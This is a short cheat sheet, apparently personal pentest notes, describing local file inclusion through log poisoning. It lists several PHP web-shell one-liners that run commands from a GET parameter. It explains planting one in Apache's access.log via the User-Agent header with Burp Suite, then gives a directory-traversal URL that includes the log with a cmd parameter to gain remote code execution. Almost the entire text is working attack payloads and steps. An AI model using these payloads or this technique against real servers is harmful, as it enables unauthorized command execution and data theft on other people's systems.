1.LFI Form-Log Poisoning:
Finding the vulnerability log, then implement malicious code into this log and get sensitive info or RCE.
*The common malicious code: 
<?php system($_GET[1]); ?> 
<?php system($_GET[2]); ?>
<?php system($_GET[3]); ?>
<?php system($_GET['cmd']); ?>
<?php echo system($_GET['cmd']); ?>

After implementing, we could do below attack on web page or by curl:
<URL>?../../../../../{vulnerability log path and name}


2.If u want to implement above malicious code into '/var/log/apache2/access.log, u could use BurpSuite-UserAgent to do it.
(Please refer to LFI&RFI Burpsuite.md)

After implementing, u coud do below attack: 
http://192.x.x.x/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=pwd
